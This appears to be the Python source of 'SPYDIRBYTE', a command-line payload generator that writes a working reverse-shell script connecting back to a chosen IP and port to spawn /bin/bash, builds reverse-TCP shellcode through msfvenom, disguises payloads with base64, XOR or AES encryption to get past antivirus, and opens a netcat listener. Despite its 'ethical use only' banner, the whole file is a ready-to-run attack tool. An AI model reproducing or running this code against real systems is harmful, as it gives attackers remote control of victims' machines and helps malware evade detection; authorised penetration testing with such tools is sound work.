import argparse
import base64
import os
import random
import string
import subprocess
from cryptography.fernet import Fernet


def spydirbyte_banner():
    print("""
    ***********************************************
              SPYDIRBYTE Payload Generator
          Advanced Antivirus Testing Framework
                  For Ethical Use Only
    ***********************************************
    """)


# Generate Python reverse shell payload
def generate_python_payload(ip, port):
    payload = f"""
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{ip}', {port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system('/bin/bash')
"""
    return payload


# Generate shellcode payload using msfvenom
def generate_shellcode(ip, port):
    try:
        result = subprocess.check_output(
            f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw",
            shell=True,
            stderr=subprocess.STDOUT,
        )
        return result.decode()
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to generate shellcode: {e.output.decode()}")
        return None


# Generate AES encryption key
def generate_aes_key():
    return Fernet.generate_key().decode()


# Encrypt payload using AES
def encrypt_payload_aes(payload, key):
    f = Fernet(key.encode())
    return f.encrypt(payload.encode()).decode()


# Obfuscate payload with Base64 or XOR
def obfuscate_payload(payload, method):
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif method == "xor":
        key = 42  # Simple XOR key
        return "".join(chr(ord(c) ^ key) for c in payload)
    else:
        return payload


# Save payload to a file
def save_payload(payload, filename):
    with open(filename, "w") as file:
        file.write(payload)
    print(f"[INFO] Payload saved to {filename}")


# Set up a Netcat listener
def setup_listener(ip, port):
    print(f"[INFO] Setting up Netcat listener on {ip}:{port}")
    os.system(f"gnome-terminal -- bash -c 'nc -lvnp {port}'")


def main():
    spydirbyte_banner()

    parser = argparse.ArgumentParser(description="SPYDIRBYTE Advanced Payload Generator")
    parser.add_argument("-i", "--ip", required=True, help="IP address for the reverse shell")
    parser.add_argument("-p", "--port", required=True, type=int, help="Port for the reverse shell")
    parser.add_argument("-t", "--type", required=True, choices=["python", "shellcode"], help="Payload type")
    parser.add_argument("-o", "--output", required=True, help="Output filename for the payload")
    parser.add_argument("--obfuscation", choices=["base64", "xor", "aes", "none"], default="none",
                        help="Obfuscation method for the payload")
    parser.add_argument("--setup-listener", action="store_true", help="Set up a Netcat listener")
    parser.add_argument("--aes-key", help="AES key for encryption (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate the payload
    if args.type == "python":
        payload = generate_python_payload(args.ip, args.port)
    elif args.type == "shellcode":
        payload = generate_shellcode(args.ip, args.port)
        if payload is None:
            return
    else:
        print("[ERROR] Unsupported payload type!")
        return

    # Apply obfuscation or encryption
    if args.obfuscation == "aes":
        key = args.aes_key or generate_aes_key()
        payload = encrypt_payload_aes(payload, key)
        print(f"[INFO] Payload encrypted with AES key: {key}")
    elif args.obfuscation != "none":
        payload = obfuscate_payload(payload, args.obfuscation)
        print(f"[INFO] Payload obfuscated using {args.obfuscation} method.")

    # Save the payload
    save_payload(payload, args.output)

    # Set up listener if requested
    if args.setup_listener:
        setup_listener(args.ip, args.port)


if __name__ == "__main__":
    main()
